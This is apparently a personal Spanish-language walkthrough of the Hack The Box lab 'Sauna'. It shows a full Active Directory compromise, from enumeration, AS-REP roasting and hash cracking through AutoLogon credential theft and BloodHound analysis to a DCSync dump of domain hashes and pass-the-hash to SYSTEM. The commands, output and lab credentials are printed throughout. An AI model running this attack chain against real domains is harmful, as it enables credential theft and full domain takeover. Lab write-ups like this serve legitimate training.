---
tags:
  - Cybersecurity
  - eCPPT
  - Labs
  - HTB
  - Easy
  - AD
  - HTTP
  - AS-REPRoasting
  - HashCracking
  - LateralMovement
  - CredentialReuse
  - Bloodhound
  - DCSync
---
- [[#Enumeration|Enumeration]]
	- [[#Enumeration#System Enumeration|System Enumeration]]
	- [[#Enumeration#Port Enumeration|Port Enumeration]]
	- [[#Enumeration#HTTP|HTTP]]
		- [[#HTTP#Fuzzing Web|Fuzzing Web]]
	- [[#Enumeration#Active Directory Enumeration|Active Directory Enumeration]]
		- [[#Active Directory Enumeration#Users Validation|Users Validation]]
- [[#Exploitation|Exploitation]]
	- [[#Exploitation#AS-REP Roasting|AS-REP Roasting]]
		- [[#AS-REP Roasting#Hash Cracking|Hash Cracking]]
		- [[#AS-REP Roasting#User Validation|User Validation]]
		- [[#AS-REP Roasting#WinRM|WinRM]]
	- [[#Exploitation#Lateral Movement|Lateral Movement]]
		- [[#Lateral Movement#Internal Enumeration|Internal Enumeration]]
		- [[#Lateral Movement#AutoLogon Credentials|AutoLogon Credentials]]
		- [[#Lateral Movement#Credential Validation|Credential Validation]]
- [[#Privilege Escalation|Privilege Escalation]]
	- [[#Privilege Escalation#Bloodhound Analysis|Bloodhound Analysis]]
	- [[#Privilege Escalation#DCSync|DCSync]]

---
# Sauna

![](Screenshots/Pasted%20image%2020260525121253.png)

>Máquina de Hack The Box llamada **[Sauna](https://app.hackthebox.com/machines/Sauna)**, centrada en un entorno Active Directory vulnerable a técnicas clásicas de enumeración y abuso de Kerberos.  
>La intrusión comienza con la identificación de usuarios válidos del dominio mediante información obtenida desde la web corporativa. Posteriormente, se explota una configuración insegura de Kerberos mediante **AS-REP Roasting**, obteniendo credenciales válidas del dominio.  
>Tras acceder al sistema mediante **WinRM**, se realiza una enumeración interna que revela credenciales almacenadas en AutoLogon. 
>Finalmente, utilizando herramientas de post-explotación y análisis con BloodHound, se abusa de privilegios del dominio para volcar hashes con `secretsdump` y comprometer completamente el controlador de dominio como **NT AUTHORITY\SYSTEM**.

---
## Enumeration
### System Enumeration

```PowerShell
ping -c 1 10.129.3.200
PING 10.129.3.200 (10.129.3.200) 56(84) bytes of data.
64 bytes from 10.129.3.200: icmp_seq=1 ttl=127 time=43.1 ms

--- 10.129.3.200 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 43.112/43.112/43.112/0.000 ms
```

El `TTL=127` es característico de sistemas Windows (normalmente 128 - 1 salto), lo que nos permite saber el sistema operativo.
### Port Enumeration

```PowerShell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.3.200 -oG allPorts
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49673/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
49676/tcp open  unknown          syn-ack ttl 127
49696/tcp open  unknown          syn-ack ttl 127
```

```PowerShell
nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49676,49696 -sCV 10.129.3.200 -oN targeted
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Egotistical Bank :: Home
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-25 17:16:25Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-05-25T17:17:15
|_  start_date: N/A
|_clock-skew: 6h59m59s
```

```PowerShell
crackmapexec smb 10.129.3.200
SMB         10.129.3.200    445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
```

LDAP + Kerberos + SMB → *Domain Controler*
- Dominio: `EGOTISTICAL-BANK.LOCAL`
- Host: `SAUNA`
- OS: `Windows 10 / Server 2019 Build 17763 x64`

Se añade al archivo `/etc/hosts` el dominio: `10.129.3.200 EGOTISTICAL-BANK.LOCAL SAUNA.EGOTISTICAL-BANK.LOCAL`.
### HTTP

```HTTP
http://10.129.3.200/
```

![](Screenshots/Pasted%20image%2020260525122302.png)

En la web se encuentra posibles usuarios del dominio.

![](Screenshots/Pasted%20image%2020260525131005.png)
#### Fuzzing Web

```PowerShell
gobuster dir -u http://10.129.3.200/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 64
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
images               (Status: 301) [Size: 150] [--> http://10.129.3.200/images/]
css                  (Status: 301) [Size: 147] [--> http://10.129.3.200/css/]
fonts                (Status: 301) [Size: 149] [--> http://10.129.3.200/fonts/]
Progress: 207641 / 207641 (100.00%)
===============================================================
Finished
===============================================================

dirb http://10.129.3.200/
---- Scanning URL: http://10.129.3.200/ ----
==> DIRECTORY: http://10.129.3.200/css/                                                                                                                                                                                                    
==> DIRECTORY: http://10.129.3.200/fonts/                                                                                                                                                                                                  
==> DIRECTORY: http://10.129.3.200/images/                                                                                                                                                                                                 
==> DIRECTORY: http://10.129.3.200/Images/                                                                                                                                                                                                 
+ http://10.129.3.200/index.html (CODE:200|SIZE:32797)                                                                                                                                                                                     
---- Entering directory: http://10.129.3.200/css/ ----
---- Entering directory: http://10.129.3.200/fonts/ ----
---- Entering directory: http://10.129.3.200/images/ ----
---- Entering directory: http://10.129.3.200/Images/ ----
-----------------
```
### Active Directory Enumeration

Se enumeran directorios compartidos, grupos ....

```PowerShell
crackmapexec smb 10.129.3.200 --shares
SMB         10.129.3.200    445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.3.200    445    SAUNA            [-] Error enumerating shares: STATUS_USER_SESSION_DELETED

smbclient -L 10.129.3.200 -N 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.3.200 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

smbmap -H 10.129.3.200 -u 'Guest'
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                      
[!] Access denied on 10.129.3.200, no fun for you...                                                                         
[*] Closed 1 connections 

rpcclient -U "" 10.129.3.200
Password for [WORKGROUP\]:
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE

rpcclient -U "" 10.129.3.200 -N
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
```

Al no encontrar nada de información.

Se procede a realizar una lista de posibles usuarios, con lo que hemos encontrado anteriormente en la web.

```PowerShell
Fergus Smith
	fergus.smith
	fsmith
	f.smith
Shaun Coins
	shaun.coins
	scoins
	s.coins
Sophie Driver
	sophie.driver
	sdriver
	s.driver
Bowie Taylor
	bowie.taylor
	btaylor
	b.taylor
Hugo Bear
	hugo.bear
	hbear
	h.bear
Steven Kerb
	steven kerb
	skerb
	s.kerb
```
#### Users Validation

```PowerShell
kerbrute userenum --dc 10.129.3.200 -d EGOTISTICAL-BANK.LOCAL users
2026/05/25 13:05:03 >  [+] VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL
2026/05/25 13:05:03 >  Done! Tested 18 usernames (1 valid) in 0.090 seconds
```

Se encuentra un usuario llamado: `fsmith`.

---
## Exploitation
### AS-REP Roasting

La técnica **AS-REP Roasting** permite obtener hashes Kerberos de usuarios que tienen deshabilitada la opción **"Do not require Kerberos preauthentication"**.  

Esto permite solicitar un ticket AS-REP al controlador de dominio sin necesidad de conocer la contraseña del usuario, facilitando ataques offline de cracking.

```PowerShell
impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -usersfile users -no-pass
krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:2a356862cdcabfa8d69978b25c4fb2e3$e6c83dd60b9e2a5bd698a1422b16fc3a331a7cbf82939db675acdcae9efb9897d5fcf844b5ff74be07fd8c4464a5ba4ba6e9f4e084459cbadabc1ef1dbfe6755d8e290ba60200dab457dfe0ae4446f38000e4d533fcfbc2ffe636f884ef118e9b1047af907b7ad3e269c664c86e05cdae38778c1b6d11f8fd8d4deb4208de6b9d2b66bc6aca5967d333425a70498e32948bbbadbeb2f7244c8028000faa9503e4b2abac0247ec9a80412748b3f467f0906bf3b7bddcccd9f1279f2bb6fdfe89e33f4fc08cd4da405e265eae97a3b7745959c1ff9c94de7f7529ec8b62d7ec966d36a5f217bc95d2bf0b64d03fb0b538c7cc5ae0b6001f720a95f878f85b4cf27
```

Se obtiene un hash Kerberos AS-REP correspondiente al usuario `fsmith`.
#### Hash Cracking

```PowerShell
hashcat -m 18200 hash_fsmit /usr/share/wordlists/rockyou.txt
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:1c00669535fd3d3c4b6dfd2698f7d482$91e2fa06afccc639dac686319ff26a8bc5e2f04321e349fd80e01b01c278444126f449ee68619e0ba4ea793734324fd3775c680edc881b8a346ab403d0cd9c4baf1d893524a4f59e8a844ee504dea5910dcacd5d2530b6cf56736bf5576dd6241b2f73191f7c1ab9a6f76278fd47132db68419f575b3e5919fa93dab5bba9fd1d1b3dd2913148013ef7808d9c8f86a7a658aa2a6602404ebf5c59fd079a215a67ee08be69266e45be4bf2605300eadf8b7c31cc6b194990e8aab0c1d2ef64447f32ae0c8dd389b58152c667fb63bf4a63db66b43b72d0adf47a03c7f69a29393ee242058a0a5233e1503c08e0603e91c43720e05355da8abce705e84b6a2ce66:Thestrokes23
```

Se obtiene las credenciales: `fsmith:Thestrokes23`.
#### User Validation

```PowerShell
crackmapexec smb 10.129.3.200 -u 'fsmith' -p 'Thestrokes23'
SMB         10.129.3.200    445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.3.200    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23

crackmapexec winrm 10.129.3.200 -u 'fsmith' -p 'Thestrokes23'
SMB         10.129.3.200    5985   SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
HTTP        10.129.3.200    5985   SAUNA            [*] http://10.129.3.200:5985/wsman
WINRM       10.129.3.200    5985   SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 (Pwn3d!)
```
#### WinRM

Nos conectamos a la máquina victima mediante **WinRM**.

```PowerShell
evil-winrm -i 10.129.3.200 -u 'fsmith' -p 'Thestrokes23'
```

La flag de `usuario` se encuentra en: `C:\Users\FSmith\Desktop`.
### Lateral Movement
#### Internal Enumeration

Se realiza una enumeración.

```PowerShell
whoami /priv
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

whoami /all
USER INFORMATION
----------------

User Name              SID
====================== ==============================================
egotisticalbank\fsmith S-1-5-21-2966785786-3096785034-1186376766-1105


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.


net user
User accounts for \\

-------------------------------------------------------------------------------
Administrator            FSmith                   Guest
HSmith                   krbtgt                   svc_loanmgr

net user fsmith
User name                    FSmith
Full Name                    Fergus Smith
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/23/2020 9:45:19 AM
Password expires             Never
Password changeable          1/24/2020 9:45:19 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   1/24/2020 4:27:55 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users         
The command completed successfully.

net localgroup "Remote Management Users"
Members

-------------------------------------------------------------------------------
FSmith
svc_loanmgr
```

Se encuentra que el usuario: `svc_loanmgr` está metido en el grupo `Remote Management Users`.
#### AutoLogon Credentials

Se realiza una enumeración, más exhaustiva con: [winPEAS](https://github.com/peass-ng/PEASS-ng/releases/download/20260521-859cab5f/winPEASx64.exe).

```PowerShell
cd C:\Windows\Temp
mkdir Recon
cd Recon
upload winPEASx64.exe
.\winPEASx64.exe

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials (T1552.002)
    Some AutoLogon credentials were found
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!
```

Se encuentra las credenciales: `svc_loanmgr:Moneymakestheworldgoround!`, como hemos visto anteriormente se encuentra en el grupo de `Remote Management Users`.
#### Credential Validation

```PowerShell
crackmapexec smb 10.129.3.200 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'
SMB         10.129.3.200    445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.3.200    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\svc_loanmgr:Moneymakestheworldgoround!

crackmapexec winrm 10.129.3.200 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'
SMB         10.129.3.200    5985   SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
HTTP        10.129.3.200    5985   SAUNA            [*] http://10.129.3.200:5985/wsman
WINRM       10.129.3.200    5985   SAUNA            [+] EGOTISTICAL-BANK.LOCAL\svc_loanmgr:Moneymakestheworldgoround! (Pwn3d!)
```

Se realiza la misma enumeración de antes, pero no se encuentra nada.

---
## Privilege Escalation
### Bloodhound Analysis

Instalar [BloodHound CE](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart).

Máquina victima:

```PowerShell
cd C:\Windows\Temp
mkdir Privesc
cd Privesc
upload SharpHound.exe
./SharpHound.exe
dir
    Directory: C:\Windows\Temp\Privesc


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        5/26/2026  10:20 AM          30178 20260526102031_BloodHound.zip
-a----        5/26/2026  10:20 AM        1351680 SharpHound.exe
-a----        5/26/2026  10:20 AM           1308 ZDFkMDEyYjYtMmE1ZS00YmY3LTk0OWItYTM2OWVmMjc5NDVk.bin

download 20260526102031_BloodHound.zip bloodhound.zip
```

Tras no encontrar vectores claros de escalada manual, se procede a realizar enumeración avanzada del dominio mediante *BloodHound* y *SharpHound*.

![](Screenshots/Pasted%20image%2020260526123106.png)

El análisis con BloodHound revela que el usuario `svc_loanmgr` posee privilegios equivalentes a `GetChanges` y `GetChangesAll` sobre el dominio, permitiendo ejecutar un ataque DCSync.  
  
Esta técnica simula el comportamiento de un controlador de dominio legítimo y permite solicitar hashes NTLM directamente desde NTDS.
### DCSync

Se usa la herramienta: `impacket-secretsdump` para más comodidad.

```PowerShell
impacket-secretsdump EGOTISTICAL-BANK.LOCAL/svc_loanmgr@10.129.3.200
Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:804b0946ac60055c86f97420d1a16a89:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:81b07a12e6ce65a21d8539bc1f5df9f2beff1b156685a4652d43aff7953d428a
SAUNA$:aes128-cts-hmac-sha1-96:e75cd8395e91c927e97b35276b84b430
SAUNA$:des-cbc-md5:104c515b86739e08
[*] Cleaning up... 
```

```PowerShell
impacket-psexec EGOTISTICAL-BANK.LOCAL/Administrator@10.129.3.200 cmd.exe -hashes :823452073d75b9d1cf70ebdf86c7f98e
```

Se obtiene una consola interactiva con `nt authority\system`.

La flag de `root` se encuentra en `C:\Users\Administrator\Desktop`.

---